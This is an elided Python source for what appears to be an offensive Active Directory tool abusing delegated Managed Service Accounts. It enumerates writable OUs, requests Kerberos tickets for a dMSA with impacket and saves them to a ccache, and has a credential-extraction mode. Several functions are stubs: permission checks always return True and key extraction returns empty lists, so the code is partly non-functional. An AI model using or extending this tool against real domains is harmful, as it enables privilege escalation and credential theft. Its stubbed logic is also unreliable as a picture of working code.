...
class ACLPermissionChecker:
    ...
    def _get_user_groups(self):
        ...
        # Add default groups that all authenticated users are members of
        groups.extend([
        ...
        try:
            # Get user's actual group memberships
    ...
    def check_permissions_on_ou(self, ou_dn, check_write=True):
        ...
        try:
            # Get the security descriptor with DACL
            self.connection.search(
                search_base=ou_dn,
                search_filter='(objectClass=*)',
            ...
            # For simplified implementation, check effective permissions
            # In a real implementation, you would parse the DACL properly

            # Try to read the security descriptor - if successful, we have some access
            if self.connection.entries[0]:
                # Check for specific permissions by attempting operations
                permissions['create_child'] = self._test_create_permission(ou_dn)
                permissions['create_dmsa'] = permissions['create_child']  # Simplified

                if check_write:
                    permissions['write'] = self._test_write_permission(ou_dn)
                    permissions['generic_write'] = permissions['write']

                # If we have both create and write, consider it near full control
    ...
    def _test_create_permission(self, ou_dn):
        ...
        try:
            # Try to check if we could create a test object (dry run)
            # This is a heuristic - actual testing would require creating an object
            test_dn = f"CN=TestObject{uuid.uuid4()},{ou_dn}"

            # If we can read the OU and it exists, assume we might have create permissions
            # In production, you'd actually try to create and delete a test object
            return True
    ...
    def _test_write_permission(self, ou_dn):
        ...
        try:
            # Similar to create test - in production, you'd test actual write operations
            return True
        except:
            return False
...
class KerberosAuthenticator:
    ...
    def get_dmsa_tgt_with_pac(self, dmsa_name, domain, dc_ip):
        ...
        try:
            ...
            # Use impacket to get TGT
            userName = f"{dmsa_name}$"

            # For dMSA, we don't need a password - it's managed by the system
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
                userName,
                "",
                domain,
                unhexlify("00000000000000000000000000000000"),  # Empty NT hash for dMSA
                unhexlify("00000000000000000000000000000000"),  # Empty LM hash
                None,
                kdcHost=dc_ip
            )
    ...
    def extract_dmsa_key_package(self, enc_part):
        ...
        try:
            # Parse the encrypted part to extract key package
            # This is a simplified version - full implementation would decrypt and parse
            return {
                'current_keys': [],
                'previous_keys': []
            }
...
"""
    ...
    def enumerate_writable_ous(self):
        ...
        try:
            # Search for all OUs and containers
            ...
            for entry in self.connection.entries:
                ...
                # Check permissions on this OU
                permissions = self.acl_checker.check_permissions_on_ou(ou_dn)

                # Check if we have any useful permissions
            ...
            # Also check the Managed Service Accounts container specifically
            ...
            # Check if Authenticated Users or Everyone has permissions anywhere
    ...
    def _save_ticket_to_ccache(self, tgt, dmsa_name, session_key):
        ...
        try:
            ...
            os.chmod(ccache_file, 0o600)  # Secure the file
                    ...
                    if group_entry.member:
                        for member_dn in group_entry.member:
                            ...
                            if self.connection.entries:
                                ...
                                try:
                                    uac_value = member_entry.userAccountControl
                                    if uac_value and str(uac_value) != '[]':
                                        uac = int(str(uac_value))
                                        if not (uac & 0x0002):
    ...
    try:
        ...
        if args.enumerate:
            ...
            if writable_ous:
                ...
                # Special note about default groups
        ...
        if args.extract_creds:
            ...
            # Find best OU for dMSA creation
            best_ou = None
            for ou in writable_ous:
